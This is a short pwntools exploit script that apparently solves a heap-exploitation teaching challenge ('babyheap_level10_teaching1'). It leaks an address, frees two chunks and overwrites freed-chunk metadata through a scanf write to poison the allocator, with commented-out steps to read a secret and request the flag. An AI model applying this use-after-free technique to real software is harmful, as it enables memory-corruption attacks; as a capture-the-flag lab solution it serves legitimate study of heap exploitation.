from pwn import *
# context(log_level='debug')
# context.terminal = ['tmux','splitw','-h']
p = process('/babyheap_level10_teaching1')
delta = lambda x, y: (0xffffffffffffffff - x)+y
p.send(b'malloc\n0\n16\n')
p.send(b'malloc\n1\n16\n')
greeting = p.clean().decode('utf-8')
ind = greeting.find('0x')
addr = greeting[ind:ind+8]
p.send(b'free\n1\n')
p.send(b'free\n0\n')
p.clean().decode('utf-8')
p.send(b'scanf\n0\n'+p64(delta(0, int(addr, 16))))
p.send(b'malloc\n2\n16\n')
p.send(b'malloc\n3\n16\n')
#p.clean().decode('utf-8')
p.interactive()
# p.send(b'puts\n3\n')
# resp = p.clean().decode('utf-8')
# ind = resp.find('Data: ')+len('Data: ')
# var = resp[ind:ind+9]
# log.info('Variable at: '+addr+ " is "+var)
# p.send(b'send_flag\n'+bytes(var, 'utf-8')+b'\n')
# p.recvline()
# log.info(p.recvline().decode('utf-8'))
# p.close()